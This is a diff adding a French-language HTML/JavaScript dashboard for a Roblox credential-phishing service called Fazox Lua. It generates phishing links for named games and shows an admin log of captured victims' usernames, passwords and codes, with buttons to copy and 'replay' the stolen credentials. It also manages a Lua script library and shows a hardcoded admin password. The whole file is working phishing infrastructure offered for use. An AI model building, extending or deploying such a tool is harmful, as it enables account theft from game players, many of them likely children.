@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fazox Lua — Backend</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root { --bg: #070b14; --bg2: #0c1220; --surface: #111a2e; --surface2: #162038; --border: rgba(59,130,246,0.18); --blue: #3b82f6; --blue-light: #60a5fa; --blue-glow: rgba(59,130,246,0.35); --cyan: #22d3ee; --text: #e8eef9; --muted: #8ba3c7; --success: #34d399; --warn: #fbbf24; --danger: #f87171; --radius: 14px; --shadow: 0 18px 50px rgba(0,0,0,0.45); }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: "Inter", system-ui, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
+    body::before { content: ""; position: fixed; inset: 0; background: radial-gradient(ellipse 80% 50% at 20% -10%, rgba(59,130,246,0.22), transparent 55%), radial-gradient(ellipse 60% 40% at 90% 10%, rgba(34,211,238,0.12), transparent 50%); pointer-events: none; z-index: 0; }
+    .app { position: relative; z-index: 1; display: grid; grid-template-columns: 260px 1fr; min-height: 100vh; }
+    .sidebar { background: linear-gradient(180deg, rgba(12,18,32,0.98), rgba(7,11,20,0.98)); border-right: 1px solid var(--border); padding: 24px 16px; display: flex; flex-direction: column; gap: 8px; position: sticky; top: 0; height: 100vh; }
+    .brand { display: flex; align-items: center; gap: 12px; padding: 8px 12px 20px; border-bottom: 1px solid var(--border); margin-bottom: 8px; }
+    .brand-icon { width: 42px; height: 42px; border-radius: 12px; background: linear-gradient(135deg, var(--blue), var(--cyan)); display: grid; place-items: center; font-weight: 800; font-size: 18px; color: #fff; box-shadow: 0 8px 24px var(--blue-glow); }
+    .brand h1 { font-size: 17px; font-weight: 700; letter-spacing: -0.02em; }
+    .brand span { display: block; font-size: 11px; color: var(--muted); font-weight: 500; margin-top: 2px; }
+    .nav-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.12em; color: var(--muted); padding: 12px 12px 6px; font-weight: 600; }
+    .nav-btn { display: flex; align-items: center; gap: 10px; width: 100%; padding: 11px 14px; border: 1px solid transparent; border-radius: 10px; background: transparent; color: var(--muted); font: inherit; font-size: 13px; font-weight: 500; cursor: pointer; transition: 0.18s ease; text-align: left; }
+    .nav-btn:hover { background: rgba(59,130,246,0.08); color: var(--text); }
+    .nav-btn.active { background: linear-gradient(90deg, rgba(59,130,246,0.22), rgba(59,130,246,0.06)); border-color: var(--border); color: var(--blue-light); box-shadow: inset 3px 0 0 var(--blue); }
+    .nav-btn svg { width: 18px; height: 18px; flex-shrink: 0; opacity: 0.85; }
+    .sidebar-footer { margin-top: auto; padding: 16px 12px 0; border-top: 1px solid var(--border); }
+    .user-pill { display: flex; align-items: center; gap: 10px; padding: 10px 12px; background: var(--surface); border: 1px solid var(--border); border-radius: 12px; }
+    .avatar { width: 34px; height: 34px; border-radius: 10px; background: linear-gradient(135deg, #1e3a5f, var(--blue)); display: grid; place-items: center; font-size: 13px; font-weight: 700; }
+    .user-pill strong { font-size: 12px; display: block; }
+    .user-pill small { font-size: 10px; color: var(--success); }
+    .main { padding: 28px 32px 40px; overflow-y: auto; }
+    .topbar { display: flex; align-items: center; justify-content: space-between; gap: 16px; margin-bottom: 28px; flex-wrap: wrap; }
+    .topbar h2 { font-size: 24px; font-weight: 700; letter-spacing: -0.03em; }
+    .topbar p { color: var(--muted); font-size: 13px; margin-top: 4px; }
+    .topbar-actions { display: flex; gap: 10px; align-items: center; }
+    .badge-live { display: flex; align-items: center; gap: 6px; padding: 8px 14px; background: rgba(52,211,153,0.1); border: 1px solid rgba(52,211,153,0.25); border-radius: 999px; font-size: 12px; color: var(--success); font-weight: 600; }
+    .badge-live::before { content: ""; width: 7px; height: 7px; border-radius: 50%; background: var(--success); box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.45; } }
+    .btn { padding: 10px 18px; border-radius: 10px; border: 1px solid var(--border); background: var(--surface); color: var(--text); font: inherit; font-size: 13px; font-weight: 600; cursor: pointer; transition: 0.18s ease; }
+    .btn:hover { border-color: rgba(59,130,246,0.45); background: var(--surface2); }
+    .btn-primary { background: linear-gradient(135deg, var(--blue), #2563eb); border-color: transparent; color: #fff; box-shadow: 0 8px 24px var(--blue-glow); }
+    .btn-primary:hover { filter: brightness(1.08); }
+    .btn-danger { background: linear-gradient(135deg, #f87171, #ef4444); border-color: transparent; color: #fff; }
+    .page { display: none; animation: fadeIn 0.25s ease; }
+    .page.active { display: block; }
+    @keyframes fadeIn { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:none; } }
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
+    .stat-card { background: linear-gradient(160deg, var(--surface), var(--bg2)); border: 1px solid var(--border); border-radius: var(--radius); padding: 20px; position: relative; overflow: hidden; }
+    .stat-card::after { content: ""; position: absolute; top: -30px; right: -30px; width: 90px; height: 90px; border-radius: 50%; background: radial-gradient(circle, var(--blue-glow), transparent 70%); opacity: 0.5; }
+    .stat-card .label { font-size: 12px; color: var(--muted); font-weight: 500; margin-bottom: 8px; }
+    .stat-card .value { font-size: 28px; font-weight: 700; letter-spacing: -0.03em; }
+    .stat-card .delta { font-size: 11px; margin-top: 6px; color: var(--success); font-weight: 600; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    @media (max-width: 960px) { .app { grid-template-columns: 1fr; } .sidebar { height: auto; position: relative; } .grid-2 { grid-template-columns: 1fr; } .main { padding: 20px 16px; } }
+    .panel { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); box-shadow: var(--shadow); overflow: hidden; }
+    .panel-head { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+    .panel-head h3 { font-size: 14px; font-weight: 600; }
+    .panel-body { padding: 20px; }
+    .field { margin-bottom: 16px; }
+    .field label { display: block; font-size: 12px; font-weight: 600; color: var(--muted); margin-bottom: 8px; }
+    .field input, .field select, .field textarea { width: 100%; padding: 12px 14px; border-radius: 10px; border: 1px solid var(--border); background: var(--bg2); color: var(--text); font: inherit; font-size: 13px; outline: none; transition: 0.18s ease; }
+    .field input:focus, .field select:focus, .field textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(59,130,246,0.15); }
+    .field textarea { min-height: 88px; resize: vertical; font-family: "JetBrains Mono", monospace; font-size: 12px; }
+    .link-output { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
+    .link-output input { flex: 1; min-width: 200px; font-family: "JetBrains Mono", monospace; font-size: 12px; padding: 12px 14px; border-radius: 10px; border: 1px solid var(--border); background: var(--bg); color: var(--cyan); }
+    .link-output button { padding: 0 16px; border-radius: 10px; border: 1px solid var(--border); background: var(--surface2); color: var(--text); font-size: 12px; font-weight: 600; cursor: pointer; }
+    .link-output button:hover { border-color: var(--blue); color: var(--blue-light); }
+    .table-wrap { overflow-x: auto; }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    th, td { text-align:left; padding:12px 16px; border-bottom:1px solid var(--border); }
+    th { font-size:11px; text-transform:uppercase; letter-spacing:0.06em; color:var(--muted); font-weight:600; background:rgba(0,0,0,0.15); }
+    tr:hover td { background:rgba(59,130,246,0.04); }
+    .tag { display:inline-block; padding:4px 10px; border-radius:999px; font-size:11px; font-weight:600; background:rgba(59,130,246,0.15); color:var(--blue-light); border:1px solid var(--border); }
+    .tag.ok { background:rgba(52,211,153,0.12); color:var(--success); border-color:rgba(52,211,153,0.25); }
+    .actions-row { display:flex; gap:6px; flex-wrap:wrap; align-items:center; }
+    .icon-btn { width:32px; height:32px; border-radius:8px; border:1px solid var(--border); background:var(--bg2); color:var(--muted); cursor:pointer; display:grid; place-items:center; font-size:14px; transition:0.15s; }
+    .icon-btn:hover { color:var(--blue-light); border-color:var(--blue); }
+    .script-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); gap:14px; }
+    .script-card { background:var(--bg2); border:1px solid var(--border); border-radius:12px; padding:16px; transition:0.18s; }
+    .script-card:hover { border-color:rgba(59,130,246,0.4); transform:translateY(-2px); }
+    .script-card h4 { font-size:14px; margin-bottom:6px; }
+    .script-card p { font-size:12px; color:var(--muted); line-height:1.5; margin-bottom:12px; }
+    .toast { position:fixed; bottom:24px; right:24px; padding:14px 20px; background:var(--surface); border:1px solid var(--border); border-radius:12px; font-size:13px; font-weight:500; box-shadow:var(--shadow); transform:translateY(80px); opacity:0; transition:0.3s ease; z-index:100; }
+    .toast.show { transform:none; opacity:1; }
+    .empty { text-align:center; padding:40px 20px; color:var(--muted); font-size:13px; }
+    .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.8); display:flex; align-items:center; justify-content:center; z-index:300; backdrop-filter:blur(4px); }
+    .modal-box { background:var(--surface); padding:40px; border-radius:var(--radius); border:1px solid var(--border); max-width:400px; width:100%; }
+    .modal-box h2 { margin-bottom:12px; }
+    .modal-box input { width:100%; margin-bottom:16px; }
+    .modal-box .error { color:var(--danger); font-size:13px; margin-top:8px; display:none; }
+    .log-entry { background: var(--bg2); border-left: 3px solid var(--blue); padding: 12px 16px; margin-bottom: 8px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
+    .log-entry .info { display:flex; flex-direction:column; gap:2px; flex:1; }
+    .log-entry .info strong { font-size:14px; }
+    .log-entry .info span { font-size:12px; color:var(--muted); }
+    .log-detail { font-size:12px; color:var(--text); background:var(--bg); padding:6px 10px; border-radius:6px; border:1px solid var(--border); margin-top:4px; word-break:break-all; font-family:"JetBrains Mono",monospace; max-height:60px; overflow-y:auto; }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar">
+      <div class="brand"><div class="brand-icon">F</div><div><h1>Fazox Lua</h1><span>Backend Hub</span></div></div>
+      <div class="nav-label">Menu</div>
+      <button class="nav-btn active" data-page="dashboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>Dashboard</button>
+      <button class="nav-btn" data-page="links"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>Générateur</button>
+      <button class="nav-btn" data-page="scripts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Scripts</button>
+      <button class="nav-btn" data-page="settings"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>Paramètres</button>
+      <button class="nav-btn" data-page="admin" id="adminNavBtn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Admin</button>
+      <div class="sidebar-footer"><div class="user-pill"><div class="avatar">FX</div><div><strong>Admin</strong><small>● En ligne</small></div></div></div>
+    </aside>
+    <main class="main">
+      <section class="page active" id="page-dashboard">
+        <div class="topbar"><div><h2>Dashboard</h2><p>Backend SQLite + API</p></div><div class="topbar-actions"><div class="badge-live">Serveur actif</div><button class="btn btn-primary" id="adminTopBtn" style="background:linear-gradient(135deg,#f87171,#ef4444);border-color:transparent;">⚡ Admin</button><button class="btn btn-primary" id="goToLinksBtn">+ Nouveau lien</button></div></div>
+        <div class="stats">
+          <div class="stat-card"><div class="label">Liens créés</div><div class="value" id="stat-links">0</div></div>
+          <div class="stat-card"><div class="label">Scripts</div><div class="value" id="stat-scripts">0</div></div>
+          <div class="stat-card"><div class="label">Logs capturés</div><div class="value" id="stat-logs">0</div></div>
+          <div class="stat-card"><div class="label">Version</div><div class="value" style="font-size:22px">v2.0</div><div class="delta">Backend</div></div>
+        </div>
+        <div class="grid-2">
+          <div class="panel"><div class="panel-head"><h3>Derniers liens</h3></div><div class="panel-body table-wrap"><table><thead><tr><th>Jeu</th><th>Slug</th><th>Clics</th></tr></thead><tbody id="recent-links"></tbody></table></div></div>
+          <div class="panel"><div class="panel-head"><h3>Scripts populaires</h3></div><div class="panel-body script-grid" id="dashboard-scripts"></div></div>
+        </div>
+      </section>
+      <section class="page" id="page-links">
+        <div class="topbar"><div><h2>Générateur</h2><p>Liens de phishing Roblox</p></div></div>
+        <div class="grid-2">
+          <div class="panel"><div class="panel-head"><h3>Créer un lien</h3></div><div class="panel-body"><div class="field"><label>Nom du jeu</label><input type="text" id="phish-game" placeholder="Murder Mystery 2" /></div><div class="field"><label>Slug personnalisé</label><input type="text" id="phish-slug" placeholder="mm2-private" /></div><button class="btn btn-primary" id="genPhishBtn">Générer</button><div class="link-output" id="phish-result" style="display:none;"><input type="text" id="phish-generated" readonly /><button onclick="copyPhishLink()">Copier</button><button class="btn" id="testPhishBtn" style="background:var(--surface2);">Tester</button></div></div></div>
+          <div class="panel"><div class="panel-head"><h3>Mes liens</h3></div><div class="panel-body table-wrap"><table><thead><tr><th>Jeu</th><th>Slug</th><th>Clics</th><th></th></tr></thead><tbody id="phish-links-table"></tbody></table></div></div>
+        </div>
+      </section>
+      <section class="page" id="page-scripts">
+        <div class="topbar"><div><h2>Scripts Lua</h2></div><button class="btn btn-primary" id="addScriptBtn">+ Ajouter</button></div>
+        <div class="script-grid" id="script-grid"></div>
+      </section>
+      <section class="page" id="page-settings">
+        <div class="topbar"><div><h2>Paramètres</h2></div></div>
+        <div class="panel" style="max-width:560px"><div class="panel-body"><p style="color:var(--muted);margin-bottom:16px;">Le webhook se configure via le fichier <code>.env</code> ou les variables d'environnement.</p><div class="field"><label>Préfixe du lien</label><input type="text" value="http://localhost:3000/p/" id="setting-prefix" readonly style="opacity:0.7;" /></div><button class="btn btn-primary" onclick="showToast('Les paramètres sont gérés côté serveur (fichier .env)')">Recharger</button></div></div>
+      </section>
+      <section class="page" id="page-admin">
+        <div class="topbar"><div><h2>Admin Panel</h2><p>Logs – <span id="admin-log-count">0</span> entrées</p></div><button class="btn btn-danger" id="clearLogsBtn">Effacer tout</button></div>
+        <div id="admin-logs-container"></div>
+      </section>
+    </main>
+  </div>
+  <div class="toast" id="toast"></div>
+  <script>
+    // ============================================================
+    // API HELPERS
+    // ============================================================
+    function getToken() { return localStorage.getItem('adminToken'); }
+
+    async function apiFetch(url, options = {}) {
+      const token = getToken();
+      if (token) {
+        options.headers = options.headers || {};
+        options.headers['Authorization'] = `Bearer ${token}`;
+      }
+      const res = await fetch(url, options);
+      if (!res.ok) {
+        let errMsg = 'Erreur serveur';
+        try { const data = await res.json(); errMsg = data.error || errMsg; } catch(e) {}
+        throw new Error(errMsg);
+      }
+      return res.json();
+    }
+
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      clearTimeout(t._timer);
+      t._timer = setTimeout(() => t.classList.remove('show'), 2600);
+    }
+
+    function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;'); }
+
+    // ============================================================
+    // NAVIGATION
+    // ============================================================
+    function goTo(page) {
+      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll(`.nav-btn[data-page="${page}"]`).forEach(b => b.classList.add('active'));
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      const target = document.getElementById('page-' + page);
+      if (target) target.classList.add('active');
+      if (page === 'admin' && adminUnlocked) renderAdminLogs();
+      if (page === 'scripts') loadScripts();
+      if (page === 'links') loadPhishLinks();
+    }
+
+    // ============================================================
+    // ADMIN AUTH
+    // ============================================================
+    let adminUnlocked = false;
+
+    function showAdminModal() {
+      const old = document.querySelector('.modal-overlay');
+      if (old) old.remove();
+      const overlay = document.createElement('div');
+      overlay.className = 'modal-overlay';
+      overlay.innerHTML = `<div class="modal-box"><h2>🔐 Accès Admin</h2><p style="color:var(--muted);margin-bottom:16px;">Mot de passe : FAZOXLEGOAT123</p><input type="password" id="adminPwInput" placeholder="Mot de passe" /><button class="btn btn-primary" id="adminPwSubmit" style="width:100%;">Déverrouiller</button><div class="error" id="adminPwError">Mot de passe incorrect</div></div>`;
+      document.body.appendChild(overlay);
+      const input = overlay.querySelector('#adminPwInput');
+      const submit = overlay.querySelector('#adminPwSubmit');
+      const error = overlay.querySelector('#adminPwError');
+      async function tryUnlock() {
+        const pw = input.value.trim();
+        try {
+          const data = await apiFetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pw }) });
+          localStorage.setItem('adminToken', data.token);
+          adminUnlocked = true;
+          overlay.remove();
+          goTo('admin');
+          renderAdminLogs();
+          showToast('Admin déverrouillé');
+          document.getElementById('adminTopBtn').textContent = '🔓 Admin';
+        } catch(e) {
+          error.style.display = 'block';
+          input.value = '';
+          input.focus();
+        }
+      }
+      submit.addEventListener('click', tryUnlock);
+      input.addEventListener('keydown', (e) => { if (e.key === 'Enter') tryUnlock(); });
+      input.focus();
+    }
+
+    function handleAdminClick(e) {
+      e.preventDefault();
+      if (adminUnlocked) { goTo('admin'); renderAdminLogs(); }
+      else showAdminModal();
+    }
+
+    document.getElementById('adminNavBtn').addEventListener('click', handleAdminClick);
+    document.getElementById('adminTopBtn').addEventListener('click', handleAdminClick);
+    document.getElementById('goToLinksBtn').addEventListener('click', () => goTo('links'));
+
+    // ============================================================
+    // PHISHING LINKS
+    // ============================================================
+    async function generatePhishingLink() {
+      const game = document.getElementById('phish-game').value.trim();
+      const customSlug = document.getElementById('phish-slug').value.trim();
+      if (!game) { showToast('Entrez un nom de jeu'); return; }
+      try {
+        const data = await apiFetch('/api/generate-phish', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ game, slug: customSlug }) });
+        document.getElementById('phish-generated').value = data.link;
+        document.getElementById('phish-result').style.display = 'flex';
+        loadPhishLinks();
+        updateStats();
+        showToast('Lien généré ✓');
+      } catch(e) { showToast('Erreur: ' + e.message); }
+    }
+
+    async function loadPhishLinks() {
+      try {
+        const links = await apiFetch('/api/phish-links');
+        const tbody = document.getElementById('phish-links-table');
+        const recent = document.getElementById('recent-links');
+        if (!links.length) {
+          tbody.innerHTML = '<tr><td colspan="4" class="empty">Aucun lien</td></tr>';
+          recent.innerHTML = '<tr><td colspan="3" class="empty">Aucun lien</td></tr>';
+          return;
+        }
+        tbody.innerHTML = links.map(l => `
+          <tr><td>${esc(l.game)}</td><td><code style="color:var(--cyan)">${esc(l.slug)}</code></td><td>${l.clicks||0}</td>
+          <td><div class="actions-row"><button class="btn" style="padding:4px 10px;font-size:11px;" onclick="window.open('/p/${esc(l.slug)}','_blank')">Tester</button>
+          <button class="icon-btn" onclick="navigator.clipboard.writeText('${window.location.origin}/p/${esc(l.slug)}').then(()=>showToast('Copié'))">⎘</button>
+          <button class="icon-btn" onclick="deletePhishLink(${l.id})">✕</button></div></td></tr>
+        `).join('');
+        recent.innerHTML = links.slice(0,5).map(l => `<tr><td>${esc(l.game)}</td><td style="font-family:monospace;font-size:11px;color:var(--cyan)">/p/${esc(l.slug)}</td><td><span class="tag ok">Actif</span></td></tr>`).join('');
+      } catch(e) { showToast('Erreur chargement liens'); }
+    }
+
+    async function deletePhishLink(id) {
+      if (!confirm('Supprimer ?')) return;
+      try { await apiFetch('/api/phish-links/'+id, { method: 'DELETE' }); loadPhishLinks(); updateStats(); showToast('Supprimé'); } catch(e) { showToast('Erreur'); }
+    }
+
+    function copyPhishLink() {
+      const input = document.getElementById('phish-generated');
+      input.select(); navigator.clipboard.writeText(input.value).then(() => showToast('Copié !'));
+    }
+
+    document.getElementById('genPhishBtn').addEventListener('click', generatePhishingLink);
+    document.getElementById('testPhishBtn').addEventListener('click', () => {
+      const val = document.getElementById('phish-generated').value;
+      if (val) window.open(val, '_blank');
+    });
+
+    // ============================================================
+    // LOGS (ADMIN)
+    // ============================================================
+    async function renderAdminLogs() {
+      if (!adminUnlocked) return;
+      try {
+        const logs = await apiFetch('/api/logs');
+        document.getElementById('admin-log-count').textContent = logs.length;
+        const container = document.getElementById('admin-logs-container');
+        if (!logs.length) { container.innerHTML = '<div class="empty">Aucun log</div>'; return; }
+        container.innerHTML = logs.map((log) => `
+          <div class="log-entry">
+            <div class="info">
+              <strong>${esc(log.username)}</strong>
+              <span>${esc(log.game)} • ${new Date(log.timestamp).toLocaleString()}</span>
+              <div class="log-detail">Pass: ${esc(log.password)}${log.code ? ' • Code: '+esc(log.code) : ''}</div>
+            </div>
+            <div class="actions-row">
+              <button class="btn" style="padding:4px 10px;font-size:11px;" onclick="replayLog(${log.id})">Replay</button>
+              <button class="icon-btn" onclick="copyLogText(${log.id})">⎘</button>
+            </div>
+          </div>
+        `).join('');
+        updateStats();
+      } catch(e) { showToast('Erreur chargement logs'); }
+    }
+
+    async function replayLog(id) {
+      try {
+        await apiFetch('/api/replay/'+id, { method: 'POST' });
+        showToast('Replay envoyé');
+      } catch(e) { showToast('Erreur replay'); }
+    }
+
+    async function copyLogText(id) {
+      try {
+        const logs = await apiFetch('/api/logs');
+        const log = logs.find(l => l.id === id);
+        if (!log) return;
+        const text = `Pseudo: ${log.username}\nPass: ${log.password}\nCode: ${log.code||'Aucun'}\nJeu: ${log.game}\nDate: ${log.timestamp}`;
+        await navigator.clipboard.writeText(text);
+        showToast('Copié');
+      } catch(e) { showToast('Erreur'); }
+    }
+
+    document.getElementById('clearLogsBtn').addEventListener('click', async () => {
+      if (!confirm('Effacer tous les logs ?')) return;
+      try {
+        const logs = await apiFetch('/api/logs');
+        for (const log of logs) {
+          await apiFetch('/api/logs/'+log.id, { method: 'DELETE' });
+        }
+        renderAdminLogs();
+        updateStats();
+        showToast('Logs effacés');
+      } catch(e) { showToast('Erreur'); }
+    });
+
+    // ============================================================
+    // SCRIPTS
+    // ============================================================
+    async function loadScripts() {
+      try {
+        const scripts = await apiFetch('/api/scripts');
+        const grid = document.getElementById('script-grid');
+        const dash = document.getElementById('dashboard-scripts');
+        if (!scripts.length) {
+          grid.innerHTML = '<div class="empty">Aucun script</div>';
+          dash.innerHTML = '<div class="empty">Aucun</div>';
+          return;
+        }
+        grid.innerHTML = scripts.map((s) => `
+          <div class="script-card">
+            <h4>${esc(s.name)}</h4>
+            <p>${esc(s.description||'')}</p>
+            <div class="actions-row">
+              <button class="btn" onclick="copyScriptContent(${s.id})">Copier</button>
+              <button class="btn" onclick="editScript(${s.id})" style="background:var(--surface2);">Modifier</button>
+              <button class="btn" onclick="deleteScript(${s.id})" style="background:rgba(248,113,113,0.2);border-color:var(--danger);">Suppr</button>
+              <span class="tag">${esc(s.version||'1.0')}</span>
+            </div>
+          </div>
+        `).join('');
+        dash.innerHTML = scripts.slice(0,2).map(s => `<div class="script-card"><h4>${esc(s.name)}</h4><p>${esc(s.description||'')}</p><span class="tag ok">${esc(s.version||'1.0')}</span></div>`).join('');
+        updateStats();
+      } catch(e) { showToast('Erreur scripts'); }
+    }
+
+    async function addScript() {
+      const name = prompt('Nom:');
+      if (!name) return;
+      const desc = prompt('Description:');
+      const content = prompt('Contenu Lua:');
+      if (!content) return;
+      try {
+        await apiFetch('/api/scripts', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, description: desc, content, version: '1.0' }) });
+        loadScripts();
+        showToast('Script ajouté');
+      } catch(e) { showToast('Erreur'); }
+    }
+
+    async function editScript(id) {
+      try {
+        const scripts = await apiFetch('/api/scripts');
+        const s = scripts.find(x => x.id === id);
+        if (!s) return;
+        const name = prompt('Nom:', s.name);
+        if (name === null) return;
+        const desc = prompt('Description:', s.description);
+        const content = prompt('Contenu:', s.content);
+        if (content === null) return;
+        await apiFetch('/api/scripts/'+id, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, description: desc, content, version: s.version }) });
+        loadScripts();
+        showToast('Modifié');
+      } catch(e) { showToast('Erreur'); }
+    }
+
+    async function deleteScript(id) {
+      if (!confirm('Supprimer ?')) return;
+      try { await apiFetch('/api/scripts/'+id, { method: 'DELETE' }); loadScripts(); showToast('Supprimé'); } catch(e) { showToast('Erreur'); }
+    }
+
+    async function copyScriptContent(id) {
+      try {
+        const scripts = await apiFetch('/api/scripts');
+        const s = scripts.find(x => x.id === id);
+        if (!s) return;
+        await navigator.clipboard.writeText(s.content);
+        showToast('Script copié');
+      } catch(e) { showToast('Erreur'); }
+    }
+
+    document.getElementById('addScriptBtn').addEventListener('click', addScript);
+
+    // ============================================================
+    // STATS
+    // ============================================================
+    async function updateStats() {
+      try {
+        const [links, scripts, logs] = await Promise.all([
+          apiFetch('/api/phish-links').catch(() => []),
+          apiFetch('/api/scripts').catch(() => []),
+          apiFetch('/api/logs').catch(() => [])
+        ]);
+        document.getElementById('stat-links').textContent = links.length;
+        document.getElementById('stat-scripts').textContent = scripts.length;
+        document.getElementById('stat-logs').textContent = logs.length;
+      } catch(e) {}
+    }
+
+    // ============================================================
+    // INIT
+    // ============================================================
+    document.querySelectorAll('.nav-btn:not(#adminNavBtn)').forEach(btn => {
+      btn.addEventListener('click', () => goTo(btn.dataset.page));
+    });
+
+    // Vérifier si un token existe déjà
+    if (localStorage.getItem('adminToken')) {
+      apiFetch('/api/phish-links').then(() => {
+        adminUnlocked = true;
+        document.getElementById('adminTopBtn').textContent = '🔓 Admin';
+      }).catch(() => {
+        localStorage.removeItem('adminToken');
+      });
+    }
+
+    loadPhishLinks();
+    loadScripts();
+    updateStats();
+
+    console.log('Fazox Backend UI prêt !');
+  </script>
+</body>
+</html>
